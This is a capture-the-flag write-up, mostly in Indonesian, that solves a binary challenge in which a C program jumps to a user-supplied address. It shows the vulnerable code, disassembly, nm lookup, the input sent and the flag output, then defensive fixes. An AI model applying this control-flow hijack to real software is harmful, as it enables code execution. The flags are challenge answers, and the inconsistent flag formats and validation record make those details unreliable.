# Writeup: Picker IV (Challenge ID: 403)

- Platform: CyLab Security Academy (picoCTF)
- Category: Binary Exploitation / Direct Control Flow Hijacking & Arbitrary Function Pointer Jump
- Difficulty: Medium (diff=2)
- Author: LT 'syreal' Jones
- Event: picoCTF 2023 / picoGym Exclusive
- Points: 100
- Flag: `academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}`

---

## Problem Statement & Scope

Tantangan menutup seri *Picker* dengan beralih dari bahasa berorientasi skrip (Python) ke bahasa kompilasi sistem (C) pada arsitektur x86-64:
> *"Can you figure out how this program works to get the flag?*
> 
> *`$ nc xebec.cylabacademy.net <port>`"*

Peserta diberikan kode sumber `picker-IV.c`, biner executable ELF 64-bit `picker-IV`, dan layanan soket TCP. Berbeda dengan tantangan rekayasa biner biasa yang membutuhkan teknik stack smashing bertahap atau format string leak, program ini secara eksplisit meminta masukan alamat heksadesimal dari pengguna dan langsung melakukan dereferensi pointer fungsi ke alamat tersebut. Target analisis adalah merekonstruksi tabel simbol biner statis dan mengarahkan aliran instruksi (`%rip`) ke subrutin `win()`.

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Dereferensi Pointer Fungsi Tidak Terpercaya (CWE-822 & CWE-676):**
   - Dalam kode sumber `picker-IV.c`:
     ```c
     int main() {
       signal(SIGSEGV, print_segf_message);
       setvbuf(stdout, NULL, _IONBF, 0);

       unsigned int val;
       printf("Enter the address in hex to jump to, excluding '0x': ");
       scanf("%x", &val);
       printf("You input 0x%x\n", val);

       void (*foo)(void) = (void (*)())val;
       foo();
     }
     ```
   - Nilai masukan pengguna `val` diparsing sebagai bilangan bulat heksadesimal (`%x`), kemudian di-cast secara langsung menjadi pointer fungsi tanpa verifikasi batas memori (*boundary check*) atau validasi terhadap daftar alamat fungsi sah (*call target whitelist*).
   - Saat instruksi pemanggilan `foo()` dieksekusi pada tingkatan assembly, CPU mengeksekusi instruksi lompatan langsung:
     ```text
     401344:  mov    -0x4(%rbp),%eax
     401347:  mov    %eax,%eax
     401349:  mov    %rax,-0x10(%rbp)
     40134d:  mov    -0x10(%rbp),%rdx
     401351:  mov    $0x0,%eax
     401356:  call   *%rdx
     ```
   - Register `%rdx` memuat alamat masukan pengguna secara harfiah, sehingga attacker memiliki kendali 100% terhadap Instruction Pointer (`%rip`).

2. **Mitigasi Kompilasi Biner (Position Independent Executable):**
   - Pengecekan atribut keamanan biner menggunakan utilitas `readelf` atau `checksec`:
     - **Canary:** Ada (tetapi tidak relevan karena tidak ada stack smashing).
     - **NX (No-Execute):** Aktif (stack dan heap tidak dapat dieksekusi).
     - **PIE (Position Independent Executable):** Dinonaktifkan (`No PIE`).
   - Karena PIE tidak aktif, seluruh segmen kode (`.text`) dimuat pada alamat virtual memori dasar tetap (`0x400000`). Hal ini membuat seluruh alamat fungsi bersifat deterministik di setiap eksekusi, meniadakan efektivitas proteksi ASLR (Address Space Layout Randomization) dari kernel.

3. **Subrutin Sasaran (`win`):**
   - Biner memuat fungsi pembantu `win()` yang bertugas membuka berkas `flag.txt` menggunakan `fopen()` dan mencetak isi byte-nya ke standard output:
     ```c
     int win() {
       FILE *fptr;
       char c;
       printf("You won!\n");
       fptr = fopen("flag.txt", "r");
       ...
     }
     ```
   - Pemeriksaan tabel simbol ELF (`nm` / `objdump -t`) memperlihatkan lokasi fungsi:
     ```text
     00000000004012a1 T win
     ```

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Ekstraksi Alamat Simbol Virtual:**
   - Unduh biner ELF `picker-IV` dari repositori berkas tantangan.
   - Periksa simbol fungsi menggunakan perintah Linux native:
     ```bash
     nm picker-IV | grep win
     ```
   - Menghasilkan alamat virtual heksadesimal: `00000000004012a1`.

2. **Pengiriman Alamat ke Layanan Jaringan:**
   - Buka koneksi TCP soket ke endpoint remote tantangan.
   - Prompt program meminta: `"Enter the address in hex to jump to, excluding '0x':"`.
   - Kirimkan string string `4012a1\n`.
   - Biner melakukan cast nilai `0x4012a1` ke pointer fungsi dan memanggil `foo()`.
   - CPU melompat ke `0x4012a1` yang merupakan awal dari subrutin `win()`.

3. **Penerimaan Token Bendera:**
   - Fungsi `win()` mengeksekusi loop pembacaan karakter `flag.txt` dan mengalirkan token ke standard output.
   - Respon jaringan:
     ```text
     You input 0x4012a1
     You won!
     academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}
     ```

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}`
- **Flag Komunitas:** `CTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}`
- **Bukti Validasi REST API:**
  ```json
  {"user": 1072359, "challenge": 403, "flag": "academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Integritas Aliran Kendali (Control Flow Integrity):**
   - Dalam kompetensi LKS Cyber Security bidang Reverse Engineering & Binary Hardening, pemanggilan pointer fungsi tidak langsung (*indirect function call*) harus selalu dilindungi mekanisme validasi integritas aliran kendali (CFI - Control Flow Integrity).
2. **Mitigasi Rekayasa Defensif:**
   - **Kompilasi Wajib PIE (Position Independent Executable):** Aktifkan flag `-fPIE -pie` pada GCC/Clang saat proses kompilasi. Dengan PIE, alamat segmen kode akan teracak secara dinamis oleh ASLR di setiap eksekusi biner, sehingga penyerang tidak dapat menebak alamat fungsi tanpa kebocoran memori (*memory leak*).
   - **Gunakan Jump Table / Finite State Machine:** Hindari menerima alamat memori secara langsung dari input pengguna. Gunakan indeks numerik sederhana yang memvalidasi batas array pointer fungsi:
     ```c
     typedef void (*handler_t)(void);
     handler_t handlers[] = { handler_a, handler_b };
     if (choice >= 0 && choice < sizeof(handlers)/sizeof(handlers[0])) {
         handlers[choice]();
     }
     ```
   - **Implementasi Clang Control Flow Integrity / Intel CET:** Gunakan compiler hardening modern seperti `-fsanitize=cfi` atau dukungan hardware Intel CET (Control-flow Enforcement Technology) untuk mencegah lompatan kode ke titik non-call-target.
